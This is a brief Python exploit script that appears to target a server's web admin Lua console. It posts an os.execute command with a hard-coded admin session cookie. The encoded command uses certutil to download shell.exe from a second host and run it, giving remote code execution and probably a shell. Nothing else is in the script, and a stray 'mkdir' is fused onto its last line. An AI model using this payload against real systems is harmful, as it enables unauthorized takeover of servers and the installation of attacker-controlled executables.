import requests

client = requests.session()

headers = { "Host": "192.168.56.105:5466",
           'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
            "Content-Length": "153",
           'Referrer Policy': 'no-referrer-when-downgrade',
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Cookie": "admin_lang=english; admin_login_name=admin; UIDADMIN=75e5058fb61a81e427ae86f55794f1f5"}

post_Data = {"command":"os.execute('cmd.exe%20%2Fc%20certutil.exe%20-urlcache%20-split%20-f%20http%3A%2F%2F192.168.56.103%2Fshell.exe%20c%3A%5Cshell.exe%20%26shell.exe')"}

response = client.post("https://192.168.56.105:5466/admin_lua_.html?r=0.3592753444724336", verify=False, data=post_Data, headers=headers)

print( response.status_code)mkdir